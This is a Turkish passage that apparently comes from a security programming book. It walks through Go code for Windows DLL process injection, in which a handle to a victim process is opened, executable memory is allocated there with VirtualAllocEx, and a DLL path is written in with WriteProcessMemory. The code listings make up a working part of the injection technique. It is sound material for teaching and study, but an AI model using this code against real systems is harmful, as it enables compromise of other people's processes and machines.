Kod, `rights` adlı `uint32` değişkenine süreç erişim haklarını atayarak başlar. Atanan gerçek değerler arasında, uzak süreç üzerinde bir iş parçacığı oluşturabilmemizi sağlayan `PROCESS_CREATE_THREAD` bulunur. Bunu, uzak süreç hakkında genel bilgileri sorgulama yeteneği veren `PROCESS_QUERY_INFORMATION` izler. Son üç süreç erişim hakkı olan `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE` ve `PROCESS_VM_READ` ise uzak sürecin sanal belleğini yönetmek için gerekli erişim haklarını sağlar.

Sonraki deklarasyon olan `inheritHandle := 0`, yeni süreç tanıtıcımızın (handle) mevcut bir handle’ı miras alıp almayacağını belirler. Yeni bir süreç handle’ı istediğimiz için, Boolean false değerini belirtmek üzere 0 geçiririz. Hemen ardından, kurban sürecin PID’sini içeren `processID := 0` değişkeni gelir. Bu arada, Windows API dokümantasyonuyla değişken türlerimizi uyumlu hale getiririz; bu yüzden her iki değişkeni de `uint32` türünde tanımlarız. Bu kalıp, `ProcOpenProcess.Call()` sistem çağrısını yapana kadar devam eder.

`.Call()` metodu değişen sayıda `uintptr` değeri tüketir; `Call()` fonksiyon imzasına bakacak olursak, bunun kelimesi kelimesine `...uintptr` olarak bildirildiğini görürüz. Buna ek olarak, dönüş türleri `uintptr` ve `error` olarak belirlenmiştir. Ayrıca `error` türü `lastErr` olarak adlandırılır; bu isme Windows API dokümantasyonunda da rastlayacaksınız ve çağrılan fonksiyon tarafından tanımlanan hata değerini içerir.

## VirtualAllocEx Windows API’siyle Bellek Manipülasyonu

Artık elimizde uzak süreç handle’ı olduğuna göre, uzak süreç içinde sanal bellek ayırmanın bir yoluna ihtiyacımız var. Bu, bellekte bir bölge ayırmak ve yazmadan önce onu başlatmak için gereklidir. Şimdi bunu inşa edelim. Liste 12-8’de tanımlanan fonksiyonu, Liste 12-7’de tanımlanan fonksiyonun hemen sonrasına yerleştirin. (Süreç enjeksiyon kodunu işlerken fonksiyonları arka arkaya eklemeye devam edeceğiz.)

```go
func VirtualAllocEx(i *Inject) error {
    var flAllocationType uint32 = MEM_COMMIT | MEM_RESERVE
    var flProtect uint32 = PAGE_EXECUTE_READWRITE
    lpBaseAddress, lastErr := ProcVirtualAllocEx.Call(
         i.RemoteProcHandle, // HANDLE hProcess
         uintptr(nullRef), // LPVOID lpAddress
         uintptr(i.DLLSize), // SIZE_T dwSize
         uintptr(flAllocationType), // DWORD flAllocationType
         // https://docs.microsoft.com/en-us/windows/desktop/Memory/memory-protection-constants
         uintptr(flProtect)) // DWORD flProtect
    if lpBaseAddress == 0 {
         return errors.Wrap(lastErr, "[I] ERROR : Can't Allocate Memory On Remote Process.")
    }

    i.Lpaddr = lpBaseAddress
    fmt.Printf("[+] Base memory address: %v\n", unsafe.Pointer(i.Lpaddr))
    return nil
}
```

**Liste 12-8:** Uzak süreçte VirtualAllocEx üzerinden bir bellek bölgesi ayırma (`/ch-12/procinjector/winsys/inject.go`)

`previousOpenProcess()` sistem çağrından farklı olarak, burada `nullRef` değişkeni üzerinden yeni bir ayrıntı ekliyoruz. `nil` anahtar kelimesi Go’da tüm null amaçlar için ayrılmıştır. Ancak bu, türlenmiş (typed) bir değerdir; yani tür belirtmeden doğrudan bir `syscall` üzerinden iletilirse, çalışma zamanı hatası ya da tür dönüştürme hatası oluşur — her iki durumda da kötü bir senaryo. Bu durumda çözüm basittir: 0 değerine çözümlenen bir değişken (örneğin bir tamsayı) tanımlarız. Bu 0 değeri, artık karşılayan Windows fonksiyonu tarafından güvenilir şekilde null değer olarak alınır ve yorumlanır.

## WriteProcessMemory Windows API’siyle Belleğe Yazma

Şimdi de `WriteProcessMemory()` fonksiyonunu kullanarak, daha önce `VirtualAllocEx()` fonksiyonuyla başlatılmış uzak süreç bellek bölgesine yazacağız. Liste 12-9’da, tüm DLL kodunu belleğe yazmak yerine, yalnızca DLL’i dosya yolu (file path) üzerinden çağırarak işleri basit tutacağız.

```go
func WriteProcessMemory(i *Inject) error {
    var nBytesWritten *byte
    dllPathBytes, err := syscall.BytePtrFromString(i.DLLPath)
    if err != nil {
        return err
    }

    writeMem, lastErr := ProcWriteProcessMemory.Call(
        i.RemoteProcHandle, // HANDLE hProcess
        i.Lpaddr, // LPVOID lpBaseAddress
        uintptr(unsafe.Pointer(dllPathBytes)), // LPCVOID lpBuffer
        uintptr(i.DLLSize), // SIZE_T nSize
        uintptr(unsafe.Pointer(nBytesWritten))) // SIZE_T *lpNumberOfBytesWritten
    if writeMem == 0 {
        return errors.Wrap(lastErr, "[I] ERROR : Can't write to process memory.")
    }

    return nil
}
```

**Liste 12-9:** DLL dosya yolunu uzak süreç belleğine yazma (`/ch-12/procInjector/winsys/inject.go`)

İlk dikkat çeken `syscall` fonksiyonu `BytePtrFromString()`’dir; bu bir kolaylık fonksiyonudur, bir `string` alır ve bir byte slice’ın başlangıç (index-0) işaretçisini döndürür; biz de bunu `dllPathBytes` değişkenine atarız.

Sonunda `unsafe.Pointer`’ı iş başında görüyoruz. `ProcWriteProcessMemory.Call`’a verilen üçüncü argüman, Windows API spesifikasyonunda, “`lpBuffer` — belirtilen sürecin adres uzayında yazılacak verileri içeren arabelleğe (buffer) işaretçi” olarak tanımlanmıştır. `dllPathBytes` içinde tanımlanan Go işaretçi değerini karşılayan Windows fonksiyonuna iletmek için, tür dönüşümlerini aşmak amacıyla `unsafe.Pointer` kullanırız. Burada vurgulanması gereken son nokta, `uintptr` ve `unsafe.Pointer`’ın kabul edilebilir ölçüde güvenli olduğudur; çünkü her ikisi de satır içi (inline) kullanılıyor ve geri dönüş değerini daha sonra yeniden kullanmak için bir değişkene atma niyetimiz yok.
